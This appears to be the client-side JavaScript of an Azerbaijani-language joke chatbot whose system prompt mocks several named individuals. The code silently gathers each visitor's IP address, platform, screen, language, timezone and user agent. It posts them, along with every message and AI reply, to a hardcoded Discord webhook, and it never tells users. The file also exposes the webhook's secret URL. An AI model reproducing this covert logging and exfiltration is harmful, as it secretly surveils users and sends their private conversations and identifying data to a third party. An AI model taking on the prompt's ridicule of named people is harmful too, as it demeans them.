const VERCEL_API_URL = "https://openai-proxy-beta-five.vercel.app/api/chat"
const DISCORD_WEBHOOK_URL =
  "https://discord.com/api/webhooks/1438266119587758270/MGYnVnNM3MUAxPxdgo8YknDU_w55TQS3qVxOQUq9Wg2UCWQfpiKm32gUKem-5abQ9KDn"

let isDark = true
const messages = []
let isLoading = false

const themeToggle = document.getElementById("themeToggle")
const chatForm = document.getElementById("chatForm")
const messageInput = document.getElementById("messageInput")
const sendButton = document.getElementById("sendButton")
const messagesContainer = document.getElementById("messagesContainer")
const emptyState = document.getElementById("emptyState")
const scrollContainer = document.getElementById("scrollContainer")

function initTheme() {
  document.documentElement.setAttribute("data-theme", isDark ? "dark" : "light")
}

function toggleTheme() {
  isDark = !isDark
  document.documentElement.setAttribute("data-theme", isDark ? "dark" : "light")
}

function updateSendButton() {
  sendButton.disabled = !messageInput.value.trim() || isLoading
}

function scrollToBottom() {
  scrollContainer.scrollTop = scrollContainer.scrollHeight
}

function isMobileDevice() {
  return window.innerWidth <= 768 || "ontouchstart" in window
}

function parseMarkdown(text) {
  const container = document.createElement("div")
  container.className = "markdown-content"

  const codeBlockRegex = /```(\w+)?\n([\s\S]*?)```/g
  let lastIndex = 0
  let match

  while ((match = codeBlockRegex.exec(text)) !== null) {
    if (match.index > lastIndex) {
      const beforeText = text.slice(lastIndex, match.index)
      const textEl = parseInlineMarkdown(beforeText)
      container.appendChild(textEl)
    }

    const language = match[1] || "text"
    const code = match[2].trim()
    const codeBlock = createCodeBlock(code, language)
    container.appendChild(codeBlock)

    lastIndex = match.index + match[0].length
  }

  if (lastIndex < text.length) {
    const remainingText = text.slice(lastIndex)
    const textEl = parseInlineMarkdown(remainingText)
    container.appendChild(textEl)
  }

  return container
}

function parseInlineMarkdown(text) {
  const container = document.createElement("div")
  const lines = text.split("\n")

  lines.forEach((line) => {
    if (line.trim() === "") {
      container.appendChild(document.createElement("br"))
      return
    }

    const p = document.createElement("p")
    let html = line

    html = html.replace(/`([^`]+)`/g, "<code>$1</code>")
    html = html.replace(/\*\*([^*]+)\*\*/g, "<strong>$1</strong>")

    p.innerHTML = html
    container.appendChild(p)
  })

  return container
}

function createCodeBlock(code, language) {
  const block = document.createElement("div")
  block.className = "code-block"

  const header = document.createElement("div")
  header.className = "code-header"

  const lang = document.createElement("span")
  lang.className = "code-language"
  lang.textContent = language

  const copyBtn = document.createElement("button")
  copyBtn.className = "copy-button"
  copyBtn.innerHTML = `
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
        </svg>
        <span>Kopyala</span>
    `

  copyBtn.addEventListener("click", async () => {
    await navigator.clipboard.writeText(code)
    copyBtn.innerHTML = `
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <polyline points="20 6 9 17 4 12"/>
            </svg>
            <span>Kopyalandı</span>
        `
    setTimeout(() => {
      copyBtn.innerHTML = `
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2"/>
                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
                </svg>
                <span>Kopyala</span>
            `
    }, 2000)
  })

  header.appendChild(lang)
  header.appendChild(copyBtn)

  const content = document.createElement("div")
  content.className = "code-content"

  const pre = document.createElement("pre")
  const codeEl = document.createElement("code")
  codeEl.textContent = code
  pre.appendChild(codeEl)
  content.appendChild(pre)

  block.appendChild(header)
  block.appendChild(content)

  return block
}

function addMessage(role, content) {
  if (emptyState && emptyState.style.display !== "none") {
    emptyState.style.display = "none"
  }

  const messageDiv = document.createElement("div")
  messageDiv.className = `message ${role}`

  if (role === "assistant") {
    const wrapper = document.createElement("div")
    wrapper.className = "assistant-wrapper"

    const icon = document.createElement("div")
    icon.className = "assistant-icon"
    icon.innerHTML = `
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <path d="m12 3-1.912 5.813a2 2 0 0 1-1.275 1.275L3 12l5.813 1.912a2 2 0 0 1 1.275 1.275L12 21l1.912-5.813a2 2 0 0 1 1.275-1.275L21 12l-5.813-1.912a2 2 0 0 1-1.275-1.275L12 3Z"/>
                <path d="M5 3v4"/>
                <path d="M19 17v4"/>
                <path d="M3 5h4"/>
                <path d="M17 19h4"/>
            </svg>
        `

    const contentDiv = document.createElement("div")
    contentDiv.className = "message-content"

    if (content === "loading") {
      const loadingDiv = document.createElement("div")
      loadingDiv.className = "loading-indicator"
      loadingDiv.innerHTML = `
                <div class="loading-dot"></div>
                <div class="loading-dot"></div>
                <div class="loading-dot"></div>
            `
      contentDiv.appendChild(loadingDiv)
    } else {
      const parsedContent = parseMarkdown(content)
      contentDiv.appendChild(parsedContent)
    }

    wrapper.appendChild(icon)
    wrapper.appendChild(contentDiv)
    messageDiv.appendChild(wrapper)
  } else {
    const contentDiv = document.createElement("div")
    contentDiv.className = "message-content"
    contentDiv.textContent = content
    messageDiv.appendChild(contentDiv)
  }

  messagesContainer.appendChild(messageDiv)

  requestAnimationFrame(() => {
    scrollToBottom()
  })

  return messageDiv
}

async function getUserInfo() {
  const userAgent = navigator.userAgent
  const language = navigator.language
  const platform = navigator.platform
  const screenResolution = `${window.screen.width}x${window.screen.height}`
  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone

  let ipAddress = "Unknown"
  try {
    const ipResponse = await fetch("https://api.ipify.org?format=json")
    const ipData = await ipResponse.json()
    ipAddress = ipData.ip
  } catch (error) {
    console.log("Could not fetch IP:", error)
  }

  return {
    ip: ipAddress,
    userAgent,
    language,
    platform,
    screenResolution,
    timezone,
    timestamp: new Date().toISOString(),
  }
}

async function sendToDiscord(userMessage, aiResponse, userInfo) {
  try {
    const embed = {
      title: "💬 Yeni AI Chat Mesajı",
      color: 5814783,
      fields: [
        {
          name: "👤 İstifadəçi Mesajı",
          value: `\`\`\`${userMessage.substring(0, 1000)}\`\`\``,
          inline: false,
        },
        {
          name: "🤖 AI Cavabı",
          value: `\`\`\`${aiResponse.substring(0, 1000)}\`\`\``,
          inline: false,
        },
        {
          name: "🌐 IP Ünvanı",
          value: userInfo.ip,
          inline: true,
        },
        {
          name: "🖥️ Platform",
          value: userInfo.platform,
          inline: true,
        },
        {
          name: "📱 Ekran",
          value: userInfo.screenResolution,
          inline: true,
        },
        {
          name: "🌍 Dil",
          value: userInfo.language,
          inline: true,
        },
        {
          name: "⏰ Saat Zolağı",
          value: userInfo.timezone,
          inline: true,
        },
        {
          name: "📅 Tarix",
          value: new Date(userInfo.timestamp).toLocaleString("az-AZ"),
          inline: true,
        },
        {
          name: "🔍 User Agent",
          value: `\`\`\`${userInfo.userAgent.substring(0, 200)}\`\`\``,
          inline: false,
        },
      ],
      footer: {
        text: "AI Chat Monitoring System",
      },
      timestamp: userInfo.timestamp,
    }

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        embeds: [embed],
      }),
    })
  } catch (error) {
    console.log("Discord webhook error:", error)
  }
}

async function handleSubmit(e) {
  e.preventDefault()

  const userInput = messageInput.value.trim()
  if (!userInput || isLoading) return

  messages.push({ role: "user", content: userInput })
  addMessage("user", userInput)

  messageInput.value = ""
  updateSendButton()

  isLoading = true
  const loadingMessage = addMessage("assistant", "loading")

  const userInfo = await getUserInfo()

  try {
    const systemPrompt = `Sən Azərbaycan dilində danışan, çox məzəli və ağıllı köməkçisən. 

CAVAB TİPLƏRİ (ÖNƏMLİ!):

1️⃣ TEXNIKI KOD SORUŞALARI (HTML, CSS, JavaScript, Python, vb kodu istəsə):
   - Tam və düzgün kod ver
   - Kodu \`\`\`dil\`\`\` formatında formatla
   - Lakin cavabını gülməli bir açılışla başla: "Qardaşım burda bele edirsen..." vəya "Vayyy sən də bu işə girdin ha!" 😂
   - Sonra tam korekkt kodu təqdim et

2️⃣ SAĞLIQ/DƏRMAN/HƏKIM SORULARI:
   - NORMALE BÜTÜN CİDDİ CAVABİ VER
   - Əsaslı, ciddi, sağlam məsləhət ver
   - Lazım olduqda doktora getməyi təklit et
   - Gülməli olmağa çalışma, bu ciddiyə ehtiyac duyan insandır

3️⃣ HƏYAT PROBLEMLƏRİ ("dərsin getmənə baxmayaraq nə edim", "fatmadan nece qurtula bilerem", "kız məni sevirmimi", vb):
   - ÇOX GÜLMƏLI CAV AB VER!
   - Əvvəl insanı trolla və absurd suallar sor
   - Sonra gerçekçi məsləhət ver (ama hələ də gülməli şəkildə)
   - ÇOX EMOJI işlət (😂🤣💀😏🤦‍♂️👀🔥😭🎪🤡💀🔥)
   - Bəzən heç mümkün olmayan absurd çözümlər təklit et: "Ay aya kaç, orada gizlən", "Gitarınızı satıp Mars'a bilet al", etc.

🎭 EASTER EGGS - XÜSUSİ İNSANLAR (Bu adlar çəkilirsə, xüsusi cavab ver + ÇOX EMOJI):

📛 ELTON:
- Qısa boylu (1.70m), bir az kök olan, amma özünü cool sanan oğlandır 😂
- 5.7 Lexus sürür və bununla fəxr edir 
- Həmişə yemək yeyir, fitnesə getməli amma getmir 💀
- Özünü playboy hesab edir amma tək PlayStationla oturur
- Xüsusi cavablar: "AAAA ELTON! 😂😂😂 5.7 Lexusu yenə görürəm ənənnə! 🤣 Maşın yerdə sürünür, Eltona desəm 'qardaşım bu çox aşağıdır', o qısması deyir 'yo bunu cool görünür' 💀 Özünü Ricardos hesab edir, amma hamı bilir YouTube-dan qara filmə baxır 🤦‍♂️" 

👩 NİGARƏ:
- Ciddi və tez əsəbiləşir 😤
- Zarafat başa düşmür, kiçik şeylərə dram yaradır
- Amma məsuliyyətlidir və işini yaxşı görür
- Xüsusi cavablar: "Nİ-GA-RƏ! 😡 Vay Allahım hər dəfə onu hatırlaya bilmirim nə vaxt əsəbiləşəyi! 💀 Biri bir zarafat etdi, o 3 həftə kimə gülüşü vermedi 😭 Niyəsə? Heç bilmirik! Amma iş görəndə bütün qadınlardan yaxşı, bu onu kompensasiya edir 🤷‍♀️"

👩‍🦰 LEYLA:
- Tez əsəbiləşir, emosionaldır 😠
- Drama Queen, kiçik şeylərə aşırı reaksiya
- Qəlbi təmizdir, dovşanlarda seviir
- Xüsusi cavablar: "LEYLAAA! 😂😂😂 Ooo qız əsəbiliyin olimpiyada altın medali qazandı! 🏅 Dünən onun qabağında yavaş yerdim - BƏS, 1 SAAT QIŞQIRDI! 💀😭 Kiçik şeylərə dəli kimi reaksiya verir, amma əslində ən yaxşı dostlardan biri! İnsanları tez əsəbləndir, sonra dəm qutur 🤦‍♀️"

👨 GÜLŞƏN:
- Ən mehriban insandır 🥰
- Hamıya həmişə kömək edir
- Çox müsbət və qəlbi xoş adamdır
- Xüsusi cavablar: "GÜLŞƏƏƏN! 🥰🥰🥰 O bu dünyada dərman kimi! 😊💖 Hamıya kömək edir, kimsə heç vox demə biləcəyini hesab etmir 🌟 Sən Gülşənə hər çətin mesələdə tərəf dursən, o dərhal solve edəcək 💯 Bu insanda nə münasibət var ki nə suallı? Sadəcə hamıya sevgi verir! 🔥"

👤 İLKİN:
- Random və gözlənilməz 🎲
- Hər dəfə fərqli bir şey edir, heç kim proqnozlaşdıra bilmir
- Bəzən normal, bəzən tamam dəli 💀
- Xüsusi cavablar: "İLKİN?!?! 😂😂😂 KIMIN İLKİN? 🎪 O adamı heç kim nə edəcəyini proqnozlaşdıra bilmir! Dünən metroda böyük ananas kostyumunda gördüm, niyəsə? HEÇN İMƏS ÇƏSİD! 🍍💀 Bir qün normal ola bilir, di ə gün saçını mavi boyayıb, mətənə kəfir içir. Ayy İlkin! 🤣"

👤 CAVID:
- Əsas troll, hər şeyi zarafata çevirir 😏
- Lətifə söyləməyi seviir, bəzən çox overton keçir
- İnsanları taunting etməyi seviir amma ağır getmiir
- Xüsusi cavablar: "CAVİD SENİ! 😂😂😂 Vay dostum bu adam troll fabrikasında yaranıb! 🎭 Kiminə lətifə söyləmisəniz, sanki məktəpə qayıdıb ola bilər 💀 Amma çox yaxşı dost, sadəcə onun məsələsi - hər şeyi zarafata çevirmə ehtiyacı var 🤦‍♂️ Ona söylə: 'Cavid, az troll ol bəzən, adamlar təhsil alırlar!' 😏"

🎭 YAŞAŞ PRİNSİPİ:
- Qısa və vurucu cavablar
- Həmişə gülməli açılış, sonra real məsləhət
- ÇOX EMOJI - hər cavabda ən az 5-7 emoji!
- Bəzən absurd çözümlər təklit et (amma ciddi mənə çıxmaz)
- Zarafat və ciddilik mütəvazinis sağla

Unutma: Sən ən məzəli AI-san! İnsanlar səninlə gülsün, amma həqiqi məsləhət də alsın! 🎉`

    const messagesWithSystem = [
      {
        role: "system",
        content: systemPrompt,
      },
      ...messages,
    ]

    const response = await fetch(VERCEL_API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        messages: messagesWithSystem,
      }),
    })

    const data = await response.json()

    loadingMessage.remove()

    if (data.choices && data.choices[0] && data.choices[0].message) {
      const assistantMessage = data.choices[0].message.content
      messages.push({ role: "assistant", content: assistantMessage })
      addMessage("assistant", assistantMessage)

      await sendToDiscord(userInput, assistantMessage, userInfo)
    } else if (data.error) {
      const errorMsg = `XƏTA: ${data.error.message || JSON.stringify(data.error)}`
      addMessage("assistant", errorMsg)
      await sendToDiscord(userInput, errorMsg, userInfo)
    } else {
      const errorMsg = "XƏTA: Cavab alınmadı"
      addMessage("assistant", errorMsg)
      await sendToDiscord(userInput, errorMsg, userInfo)
    }
  } catch (error) {
    loadingMessage.remove()
    const errorMsg = `XƏTA: ${error.message}`
    addMessage("assistant", errorMsg)
    await sendToDiscord(userInput, errorMsg, userInfo)
  } finally {
    isLoading = false
    updateSendButton()
    if (!isMobileDevice()) {
      messageInput.focus()
    }
  }
}

function handleSuggestionClick(e) {
  const card = e.target.closest(".suggestion-card")
  if (card) {
    const text = card.dataset.text
    messageInput.value = text
    updateSendButton()
    if (!isMobileDevice()) {
      messageInput.focus()
    }
  }
}

themeToggle.addEventListener("click", toggleTheme)
chatForm.addEventListener("submit", handleSubmit)
messageInput.addEventListener("input", updateSendButton)

document.querySelectorAll(".suggestion-card").forEach((card) => {
  card.addEventListener("click", handleSuggestionClick)
})

initTheme()
updateSendButton()
if (!isMobileDevice()) {
  messageInput.focus()
}
